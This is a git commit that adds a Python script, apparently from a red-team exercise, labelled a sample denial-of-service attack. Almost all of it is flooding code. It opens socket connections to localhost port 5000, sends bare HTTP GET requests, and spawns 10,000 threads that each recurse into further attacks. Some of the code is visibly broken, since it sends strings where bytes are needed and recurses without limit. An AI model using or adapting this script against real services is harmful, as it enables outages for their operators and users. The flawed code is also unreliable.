9eba296270d938a11b6dcb27741a9bd95545c1ad
amyfr <66386831+amyfr@users.noreply.github.com>
2020-10-20 22:12:06 +0300

    Update sampleDOS.py

--- RedTeam/sampleDOS.py
+++ RedTeam/sampleDOS.py
@@ -1,1 +1,29 @@
 # Sample DOS Attack
+import socket, sys, os, threading, time
+print ("Attack localhost on port 5000")  
+ 
+def attack():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
+        s.connect(("127.0.0.1", 5000))  
+        print ("GET /" + "127.0.0.1" + " HTTP/1.1")
+        print ("\n")
+        s.send("GET /" + "127.0.0.1" + " HTTP/1.1\r\n")  
+        s.send("Host: " + "127.0.0.1"  + "\r\n\r\n");
+        s.close()
+    except:
+        print("Socket Dead.")
+    for x in range(10000):
+        time.sleep(0.001)
+        attack()
+
+def threader():
+    global threads
+    threads=[]
+    for i in range(10000):
+        t=threading.Thread(target=attack)
+        threads.append(t)
+        t.start()
+
+        
+threader()
